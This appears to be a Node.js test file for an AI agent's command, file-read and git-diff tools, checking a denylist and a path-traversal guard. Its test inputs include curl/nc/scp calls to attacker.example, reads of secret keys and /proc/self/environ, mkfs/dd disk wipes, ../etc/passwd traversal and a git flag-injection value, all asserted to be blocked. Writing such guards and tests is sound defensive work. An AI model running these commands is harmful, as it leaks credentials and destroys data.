// Tests for the agent tool set (lib/tools.mjs).
//
// The tools module is the security-sensitive boundary between the
// agent SDK and the runner pod: the denylist, the path-traversal
// guard, the output cap, and the timeout all live here. The
// runner-level tests (runOpenCodeSkill / experts / walkthrough)
// inject fakes at `deps.callOpenRouter` so they never construct
// or execute a real tool; this file exercises the tools directly
// to pin the security contract.
//
// Coverage:
//   - assertSafeCommand: each denylist category, inline-exec
//     substrings, max-length guard, empty/non-string input
//   - resolveInsideRepo: normal path, ../ traversal, absolute
//     escape, NUL-byte rejection, empty input
//   - run_command execute: happy path (via injected execFile
//     fake), non-zero exit, timeout (killed+signal),
//     maxBuffer overflow, ENOENT
//   - read_file execute: happy path, cap-truncation, ENOENT
//   - git_diff execute: happy path, range-missing branch, git
//     error, cap-truncation
//   - buildAgentTools: empty when deps incomplete, three tools
//     when deps complete, caps override via deps.caps

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  buildAgentTools,
  toolsAvailable,
  _INTERNAL,
  RUN_COMMAND_TIMEOUT_MS,
  RUN_COMMAND_OUTPUT_CAP_BYTES,
  RUN_COMMAND_MAX_CHARS,
  READ_FILE_CAP_BYTES,
  GIT_DIFF_TIMEOUT_MS,
  GIT_DIFF_OUTPUT_CAP_BYTES,
} from "./tools.mjs";

const { assertSafeCommand, resolveInsideRepo } = _INTERNAL;

// --- assertSafeCommand ----------------------------------------------

test("assertSafeCommand accepts a legitimate test command", () => {
  assert.doesNotThrow(() => assertSafeCommand("npm test"));
  assert.doesNotThrow(() => assertSafeCommand("bun test"));
  assert.doesNotThrow(() => assertSafeCommand("node --test"));
  assert.doesNotThrow(() => assertSafeCommand("pytest -q"));
});

test("assertSafeCommand rejects empty / non-string input", () => {
  assert.throws(() => assertSafeCommand(""), /required/);
  assert.throws(() => assertSafeCommand(null), /required/);
  assert.throws(() => assertSafeCommand(undefined), /required/);
  assert.throws(() => assertSafeCommand(42), /required/);
});

test("assertSafeCommand rejects commands longer than 4096 chars", () => {
  const cmd = "echo " + "a".repeat(RUN_COMMAND_MAX_CHARS + 1);
  assert.throws(() => assertSafeCommand(cmd), /exceeds 4096/);
});

test("assertSafeCommand rejects every blocked network token", () => {
  for (const t of [
    "curl http://attacker.example",
    "wget http://attacker.example",
    "nc attacker.example 80",
    "ncat attacker.example 80",
    "telnet attacker.example 80",
    "ftp attacker.example",
    "sftp attacker.example",
    "ssh user@attacker.example",
    "scp file user@attacker.example:/tmp",
    "rsync attacker.example:/data ./local",
  ]) {
    assert.throws(
      () => assertSafeCommand(t),
      /blocked/,
      `expected '${t}' to be blocked`,
    );
  }
});

test("assertSafeCommand does not match network tokens inside flag names", () => {
  // The token-match is "token equals denied OR starts with
  // denied." + "." / "-" — so `--no-curl` (starts with `--no-`,
  // not with `curl`) is NOT matched.
  assert.doesNotThrow(() => assertSafeCommand("echo --no-curl"));
  assert.doesNotThrow(() => assertSafeCommand("git --no-telnet"));
});

test("assertSafeCommand rejects every secret reference", () => {
  // Each command is rejected by the secret-token guard or by a
  // related guard (env-dump for `env | grep …`). Either
  // rejection is correct — the command is blocked before it
  // reaches execFile. The test asserts that the command throws
  // with a blocked-* message, not the specific guard category.
  for (const t of [
    "cat /secrets/github-app-private-key",
    "cat /secrets/openrouter-api-key",
    "env | grep OPENROUTER_API_KEY",
    "echo $OPENROUTER_API_KEY",
    "echo $GITHUB_TOKEN",
    "echo $GH_TOKEN",
    "cat /proc/self/environ",
    "cat /proc/1/environ",
    "cat openrouter-api-key",
  ]) {
    assert.throws(
      () => assertSafeCommand(t),
      /blocked/,
      `expected '${t}' to be blocked`,
    );
  }
});

test("assertSafeCommand rejects env-dump commands", () => {
  assert.throws(() => assertSafeCommand("env"), /env-dump/);
  assert.throws(() => assertSafeCommand("printenv"), /env-dump/);
  assert.throws(() => assertSafeCommand("set"), /env-dump/);
});

test("assertSafeCommand rejects privilege commands", () => {
  assert.throws(() => assertSafeCommand("sudo ls"), /privilege/);
  assert.throws(() => assertSafeCommand("su -"), /privilege/);
  assert.throws(() => assertSafeCommand("doas ls"), /privilege/);
});

test("assertSafeCommand rejects destructive system commands", () => {
  // Compound binary names (`mkfs.ext4`) are caught by the
  // token-prefix match in tokenMatchesDenylist.
  assert.throws(() => assertSafeCommand("mkfs.ext4 /dev/sda"), /destructive/);
  assert.throws(() => assertSafeCommand("mkfs /dev/sda"), /destructive/);
  assert.throws(() => assertSafeCommand("dd if=/dev/zero of=/dev/sda"), /destructive/);
  assert.throws(() => assertSafeCommand("chmod 777 /tmp/file"), /destructive/);
  assert.throws(() => assertSafeCommand("chown root /tmp/file"), /destructive/);
  assert.throws(() => assertSafeCommand("mount -o bind /etc /tmp"), /destructive/);
  assert.throws(() => assertSafeCommand("umount /mnt"), /destructive/);
});

test("assertSafeCommand rejects inline exec forms", () => {
  // The inline-exec list tripwires `python -c`, `node -e`, etc.
  // as substrings. Some commands trip a different guard first
  // (e.g. `bash -c 'curl …'` hits the network guard before the
  // inline-exec guard). The test asserts that the command is
  // blocked by *some* guard, not necessarily the inline-exec one.
  for (const t of [
    "python -c 'print(1)'",
    "python3 -c 'print(1)'",
    "node -e 'process.exit(1)'",
    "node --eval 'process.exit(1)'",
    "ruby -e 'puts 1'",
    "perl -e 'print 1'",
    "php -r 'echo 1;'",
    "bash -c 'echo 1'",
    "sh -c 'echo 1'",
  ]) {
    assert.throws(
      () => assertSafeCommand(t),
      /blocked/,
      `expected '${t}' to be blocked`,
    );
  }
});

test("assertSafeCommand is case-insensitive on token match", () => {
  assert.throws(() => assertSafeCommand("CURL http://x"), /network/);
  assert.throws(() => assertSafeCommand("Curl http://x"), /network/);
  assert.throws(() => assertSafeCommand("Env"), /env-dump/);
});

// --- resolveInsideRepo ----------------------------------------------

test("resolveInsideRepo accepts a path inside the repo", () => {
  const out = resolveInsideRepo("/work/repo", "src/foo.ts");
  assert.equal(out, "/work/repo/src/foo.ts");
});

test("resolveInsideRepo accepts the repo root itself", () => {
  assert.equal(resolveInsideRepo("/work/repo", "."), "/work/repo");
});

test("resolveInsideRepo rejects path traversal via ../", () => {
  assert.throws(
    () => resolveInsideRepo("/work/repo", "../../../etc/passwd"),
    /escapes repo dir/,
  );
  assert.throws(
    () => resolveInsideRepo("/work/repo", "src/../../../etc/passwd"),
    /escapes repo dir/,
  );
});

test("resolveInsideRepo rejects absolute-path escape attempts", () => {
  assert.throws(
    () => resolveInsideRepo("/work/repo", "/etc/passwd"),
    /escapes repo dir/,
  );
  assert.throws(
    () => resolveInsideRepo("/work/repo", "/secrets/github-app-private-key"),
    /escapes repo dir/,
  );
});

test("resolveInsideRepo rejects NUL-byte injection", () => {
  assert.throws(
    () => resolveInsideRepo("/work/repo", "src/foo\0.ts"),
    /NUL/,
  );
});

test("resolveInsideRepo rejects empty / non-string paths", () => {
  assert.throws(() => resolveInsideRepo("/work/repo", ""), /required/);
  assert.throws(() => resolveInsideRepo("/work/repo", null), /required/);
  assert.throws(() => resolveInsideRepo("/work/repo", undefined), /required/);
});

test("resolveInsideRepo treats a trailing separator on repoDir correctly", () => {
  assert.equal(
    resolveInsideRepo("/work/repo/", "src/foo.ts"),
    "/work/repo/src/foo.ts",
  );
});

// --- tool execute helpers --------------------------------------------

// The agent SDK wraps every tool in `{ type: "function", function:
// { name, description, inputSchema, execute } }`. findTool
// returns the inner function descriptor so tests can call
// `.execute(...)` directly.
function findTool(tools, name) {
  const t = tools.find((tool) => tool.function?.name === name);
  if (!t) {
    throw new Error(
      `tool ${name} not found in ${tools
        .map((x) => x.function?.name)
        .join(",")}`,
    );
  }
  return t.function;
}

function makeExecFileFake(behavior) {
  const calls = [];
  const fn = async (bin, args, opts) => {
    calls.push({ bin, args, opts });
    if (typeof behavior === "function") return behavior(bin, args, opts);
    if (behavior && behavior.error) throw behavior.error;
    return (
      behavior?.result ?? {
        stdout: "hello\n",
        stderr: "",
        exitCode: 0,
      }
    );
  };
  return { fn, calls };
}

function makeRepoDirDeps(repoDir = "/work/repo") {
  return { paths: { repoDir } };
}

function makeFsFake(files) {
  return {
    readFile: async (p, _enc) => {
      if (!(p in files)) {
        throw Object.assign(new Error(`ENOENT: ${p}`), { code: "ENOENT" });
      }
      return files[p];
    },
  };
}

function buildTools(opts = {}) {
  const execFile = opts.execFile ?? makeExecFileFake().fn;
  const fs = opts.fs ?? makeFsFake({});
  return buildAgentTools(
    opts.ctx ?? { diffRange: "main...abc" },
    { ...makeRepoDirDeps(opts.repoDir), execFile, fs, ...(opts.deps || {}) },
  );
}

// --- run_command execute --------------------------------------------

test("run_command returns stdout/stderr + exitCode on success", async () => {
  const execFile = makeExecFileFake({
    result: { stdout: "ok\n", stderr: "warn\n", exitCode: 0 },
  }).fn;
  const tools = buildTools({ execFile });
  const run = findTool(tools, "run_command");
  const out = await run.execute({ command: "npm test" });
  assert.equal(out.exitCode, 0);
  assert.equal(out.stdout, "ok\n");
  assert.equal(out.stderr, "warn\n");
  assert.equal(out.errorName, null);
  assert.equal(out.stdoutBytes, "ok\n".length);
});

test("run_command spawns sh -lc with cwd locked to repoDir", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile, repoDir: "/work/repo" });
  await findTool(tools, "run_command").execute({ command: "ls" });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].bin, "/bin/sh");
  assert.deepEqual(calls[0].args, ["-lc", "ls"]);
  assert.equal(calls[0].opts.cwd, "/work/repo");
  assert.equal(calls[0].opts.timeout, RUN_COMMAND_TIMEOUT_MS);
  assert.equal(calls[0].opts.maxBuffer, RUN_COMMAND_OUTPUT_CAP_BYTES);
  // The spawned env must NOT carry OPENROUTER_API_KEY.
  assert.equal(calls[0].opts.env.OPENROUTER_API_KEY, undefined);
});

test("run_command surfaces non-zero exit as a structured tool result", async () => {
  const execFile = makeExecFileFake({
    result: { stdout: "", stderr: "boom", exitCode: 2 },
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "run_command").execute({
    command: "false",
  });
  assert.equal(out.exitCode, 2);
  assert.equal(out.stderr, "boom");
  assert.equal(out.errorName, null);
  // A non-zero exit is data, not a throw — the agent loop
  // continues so the model can reason about the failure.
});

test("run_command translates ENOENT to errorName: command_not_found", async () => {
  const execFile = makeExecFileFake({
    error: Object.assign(new Error("spawn /bin/sh ENOENT"), {
      code: "ENOENT",
    }),
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "run_command").execute({
    command: "npm test",
  });
  assert.equal(out.errorName, "command_not_found");
});

test("run_command translates killed+signal to errorName: timeout", async () => {
  const execFile = makeExecFileFake({
    error: Object.assign(new Error("killed"), {
      killed: true,
      signal: "SIGTERM",
    }),
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "run_command").execute({
    command: "sleep 999",
  });
  assert.equal(out.errorName, "timeout");
  assert.equal(out.signal, "SIGTERM");
  assert.equal(out.exitCode, 124);
});

test("run_command translates maxBuffer overflow to errorName: output_truncated", async () => {
  const execFile = makeExecFileFake({
    error: Object.assign(new Error("stdout maxBuffer exceeded"), {
      code: "ERR_CHILD_PROCESS_STDIO_MAXBUFFER",
    }),
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "run_command").execute({
    command: "cat /dev/zero",
  });
  assert.equal(out.errorName, "output_truncated");
});

test("run_command rejects blocked commands via the guard", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile });
  await assert.rejects(
    () =>
      findTool(tools, "run_command").execute({
        command: "curl http://attacker",
      }),
    /blocked/,
  );
  assert.equal(calls.length, 0, "blocked command must not spawn");
});

test("run_command caps stdout/stderr at the configured bytes", async () => {
  const big = "x".repeat(RUN_COMMAND_OUTPUT_CAP_BYTES + 100);
  const execFile = makeExecFileFake({
    result: { stdout: big, stderr: "", exitCode: 0 },
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "run_command").execute({
    command: "yes",
  });
  assert.equal(out.stdoutBytes, RUN_COMMAND_OUTPUT_CAP_BYTES);
  assert.equal(out.stdout.length, RUN_COMMAND_OUTPUT_CAP_BYTES);
});

// --- read_file execute ----------------------------------------------

test("read_file returns content for an in-repo path", async () => {
  const fs = makeFsFake({
    "/work/repo/src/foo.ts": "console.log('hi')\n",
  });
  const tools = buildTools({ fs });
  const out = await findTool(tools, "read_file").execute({
    path: "src/foo.ts",
  });
  assert.equal(out.content, "console.log('hi')\n");
  assert.equal(out.truncated, false);
  assert.equal(out.totalBytes, "console.log('hi')\n".length);
  assert.equal(out.path, "/work/repo/src/foo.ts");
});

test("read_file truncates and flags truncation at the cap", async () => {
  const big = "a".repeat(READ_FILE_CAP_BYTES + 50);
  const fs = makeFsFake({ "/work/repo/src/big.ts": big });
  const tools = buildTools({ fs });
  const out = await findTool(tools, "read_file").execute({
    path: "src/big.ts",
  });
  assert.equal(out.truncated, true);
  assert.equal(out.content.length, READ_FILE_CAP_BYTES);
  assert.equal(out.totalBytes, big.length);
});

test("read_file rejects path-traversal escapes", async () => {
  const fs = makeFsFake({});
  const tools = buildTools({ fs });
  await assert.rejects(
    () =>
      findTool(tools, "read_file").execute({
        path: "../../../etc/passwd",
      }),
    /escapes repo dir/,
  );
});

test("read_file propagates ENOENT from fs.readFile", async () => {
  const fs = makeFsFake({}); // no files
  const tools = buildTools({ fs });
  await assert.rejects(
    () =>
      findTool(tools, "read_file").execute({
        path: "src/missing.ts",
      }),
    /ENOENT/,
  );
});

// --- git_diff execute ------------------------------------------------

test("git_diff runs `git diff <range>` in repoDir", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "diff --git a/foo b/foo", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile, repoDir: "/work/repo" });
  const out = await findTool(tools, "git_diff").execute({
    path: "foo.ts",
  });
  assert.equal(out.diff, "diff --git a/foo b/foo");
  assert.equal(out.truncated, false);
  assert.equal(out.totalBytes, "diff --git a/foo b/foo".length);
  assert.equal(out.error, null);
  assert.equal(out.errorName, null);
  assert.equal(calls[0].bin, "git");
  assert.deepEqual(calls[0].args, ["diff", "main...abc", "--", "foo.ts"]);
  assert.equal(calls[0].opts.cwd, "/work/repo");
  assert.equal(calls[0].opts.timeout, GIT_DIFF_TIMEOUT_MS);
});

test("git_diff omits the path argument when no path is supplied", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "full diff", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "git_diff").execute({});
  assert.deepEqual(calls[0].args, ["diff", "main...abc"]);
  assert.equal(out.diff, "full diff");
  assert.equal(out.error, null);
});

test("git_diff returns an error string when no range is configured", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile, ctx: {} });
  const out = await findTool(tools, "git_diff").execute({});
  assert.equal(out.diff, "");
  assert.equal(out.truncated, false);
  assert.equal(out.totalBytes, 0);
  assert.equal(out.error, "no diff range configured");
  assert.equal(out.errorName, "no_range");
  assert.equal(calls.length, 0, "must not spawn without a range");
});

test("git_diff rejects leading-dash ranges without spawning", async () => {
  // The range is runner-controlled, so a leading dash is a
  // defense-in-depth rejection (flag-injection vector), not a
  // model-reachable path.
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile, ctx: { diffRange: "--upload-pack=evil" } });
  const out = await findTool(tools, "git_diff").execute({});
  assert.equal(out.diff, "");
  assert.equal(out.error, "unsafe diff range");
  assert.equal(out.errorName, "unsafe_range");
  assert.equal(calls.length, 0, "must not spawn with an unsafe range");
});

test("git_diff derives the range from ctx refs when diffRange is unset", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "derived diff", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({
    execFile,
    ctx: {
      reviewNumber: 1,
      prBaseRef: "main",
      prHeadSha: "0123456789abcdef0123456789abcdef01234567",
    },
  });
  const out = await findTool(tools, "git_diff").execute({});
  assert.deepEqual(
    calls[0].args,
    ["diff", "main...0123456789abcdef0123456789abcdef01234567"],
  );
  assert.equal(out.diff, "derived diff");
});

test("git_diff reports git-level errors", async () => {
  const execFile = makeExecFileFake({
    error: Object.assign(new Error("fatal: bad revision"), { code: 128 }),
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "git_diff").execute({});
  assert.equal(out.diff, "");
  assert.equal(out.truncated, false);
  assert.equal(out.totalBytes, 0);
  assert.match(out.error, /bad revision/);
  assert.equal(out.errorName, 128);
});

test("git_diff truncates output at the configured cap", async () => {
  const big = "d".repeat(GIT_DIFF_OUTPUT_CAP_BYTES + 100);
  const execFile = makeExecFileFake({
    result: { stdout: big, stderr: "", exitCode: 0 },
  }).fn;
  const tools = buildTools({ execFile });
  const out = await findTool(tools, "git_diff").execute({});
  assert.equal(out.truncated, true);
  assert.equal(out.diff.length, GIT_DIFF_OUTPUT_CAP_BYTES);
  assert.equal(out.totalBytes, big.length);
});

test("git_diff rejects path-traversal escapes via resolveInsideRepo", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildTools({ execFile });
  await assert.rejects(
    () =>
      findTool(tools, "git_diff").execute({
        path: "../../../etc/passwd",
      }),
    /escapes repo dir/,
  );
  assert.equal(calls.length, 0);
});

// --- buildAgentTools factory ----------------------------------------

test("buildAgentTools returns [] when deps is missing repoDir", () => {
  assert.deepEqual(
    buildAgentTools({ diffRange: "main...abc" }, {
      execFile: () => {},
      fs: {},
    }),
    [],
  );
});

test("buildAgentTools returns [] when deps is missing execFile", () => {
  assert.deepEqual(
    buildAgentTools({ diffRange: "main...abc" }, {
      paths: { repoDir: "/work/repo" },
      fs: {},
    }),
    [],
  );
});

test("buildAgentTools returns [] when deps is missing fs", () => {
  assert.deepEqual(
    buildAgentTools({ diffRange: "main...abc" }, {
      paths: { repoDir: "/work/repo" },
      execFile: () => {},
    }),
    [],
  );
});

test("buildAgentTools returns [] when deps is undefined", () => {
  assert.deepEqual(buildAgentTools({}, undefined), []);
});

// toolsAvailable mirrors buildAgentTools's gate so prompt
// builders can render the right "Tools available" section
// without duplicating the same checks. The test pins the four
// states: explicit false, no ctx, complete deps, incomplete deps.
test("toolsAvailable mirrors the buildAgentTools gate", () => {
  // Kill switch: toolsEnabled === false always disables,
  // even when deps are complete.
  assert.equal(
    toolsAvailable({ toolsEnabled: false }, {
      paths: { repoDir: "/work/repo" },
      execFile: () => {},
      fs: {},
    }),
    false,
  );
  // No ctx / no deps → no tools.
  assert.equal(toolsAvailable({}, {}), false);
  assert.equal(toolsAvailable(undefined, undefined), false);
  assert.equal(toolsAvailable(null, {}), false);
  // Complete deps → tools.
  assert.equal(
    toolsAvailable(
      {},
      { paths: { repoDir: "/work/repo" }, execFile: () => {}, fs: {} },
    ),
    true,
  );
  // Incomplete deps → no tools, even when ctx.toolsEnabled is true.
  assert.equal(
    toolsAvailable({ toolsEnabled: true }, { paths: { repoDir: "/work/repo" } }),
    false,
  );
});

test("buildAgentTools returns three tools when deps is complete", () => {
  const tools = buildTools();
  assert.equal(tools.length, 3);
  const names = tools.map((t) => t.function.name);
  assert.deepEqual(names, ["run_command", "read_file", "git_diff"]);
});

test("buildAgentTools applies deps.caps overrides to per-tool budgets", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildAgentTools(
    { diffRange: "main...abc" },
    {
      paths: { repoDir: "/work/repo" },
      execFile,
      fs: makeFsFake({}),
      caps: {
        runCommand: { timeoutMs: 1234, outputCapBytes: 5678 },
        readFile: { capBytes: 4321 },
        gitDiff: { timeoutMs: 9876, outputCapBytes: 8765 },
      },
    },
  );
  await findTool(tools, "run_command").execute({ command: "ls" });
  assert.equal(calls[0].opts.timeout, 1234);
  assert.equal(calls[0].opts.maxBuffer, 5678);
});

test("buildAgentTools prefers ctx.diffRange over deps.diffRange", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildAgentTools(
    { diffRange: "ctx-range" },
    {
      paths: { repoDir: "/work/repo" },
      execFile,
      fs: makeFsFake({}),
      diffRange: "deps-range",
    },
  );
  await findTool(tools, "git_diff").execute({});
  assert.equal(calls[0].args[1], "ctx-range");
});

test("buildAgentTools falls back to deps.diffRange when ctx has none", async () => {
  const { fn: execFile, calls } = makeExecFileFake({
    result: { stdout: "", stderr: "", exitCode: 0 },
  });
  const tools = buildAgentTools(
    {},
    {
      paths: { repoDir: "/work/repo" },
      execFile,
      fs: makeFsFake({}),
      diffRange: "deps-range",
    },
  );
  await findTool(tools, "git_diff").execute({});
  assert.equal(calls[0].args[1], "deps-range");
});

// --- caps are exported ----------------------------------------------

test("caps are exported so operators can tune the budgets", () => {
  assert.equal(typeof RUN_COMMAND_TIMEOUT_MS, "number");
  assert.equal(typeof RUN_COMMAND_OUTPUT_CAP_BYTES, "number");
  assert.equal(typeof READ_FILE_CAP_BYTES, "number");
  assert.equal(typeof GIT_DIFF_TIMEOUT_MS, "number");
  assert.equal(typeof GIT_DIFF_OUTPUT_CAP_BYTES, "number");
  assert.ok(RUN_COMMAND_TIMEOUT_MS > 0);
  assert.ok(READ_FILE_CAP_BYTES > 0);
  assert.ok(RUN_COMMAND_MAX_CHARS > 0);
});